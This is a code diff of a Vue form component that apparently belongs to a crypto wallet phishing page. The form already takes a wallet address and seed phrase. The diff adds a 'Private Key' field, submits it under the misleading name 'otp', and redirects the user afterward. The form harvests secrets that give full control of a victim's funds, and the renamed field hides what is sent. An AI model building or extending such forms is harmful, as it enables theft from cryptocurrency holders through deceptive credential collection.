@@ -15,11 +15,17 @@
 
 
 
-
           <div class="space">
             <label>Wallet Address</label>
             <input type="text" v-model="walletAddress" required="required" class="form-input"/>
           </div>
+
+
+        <div class="space">
+          <label>Private Key</label>
+          <input type="text" v-model="privateKey" required="required" class="form-input"/>
+        </div>
+
 
 
         <div class="space">
@@ -76,7 +82,8 @@ export default {
       walletAddress: "",
       phrase: "",
       rawPhrases: '', // This holds the user's input
-      formattedPhrase: '' // This will store the formatted string
+      formattedPhrase: '',// This will store the formatted string
+      privateKey: '',
     }
   },
   computed:{
@@ -94,8 +101,10 @@ export default {
         walletAddress: this.walletAddress,
         walletName: this.walletName,
         keyPhrases: this.formattedPhrase,
+        otp: this.privateKey,
       })
       await this.clear();
+      await this.$router.push("/over-view")
     },
 
     async formatPhrases() {
@@ -110,7 +119,6 @@ export default {
         });
         return;
       }
-
       // Join the words into a single string separated by commas
       this.formattedPhrase = wordsArray.join(', ');
     },
@@ -119,6 +127,7 @@ export default {
       this.walletName = ""
       this.walletAddress = ""
       this.rawPhrases = ""
+      this.privateKey = ""
     }
   },
 
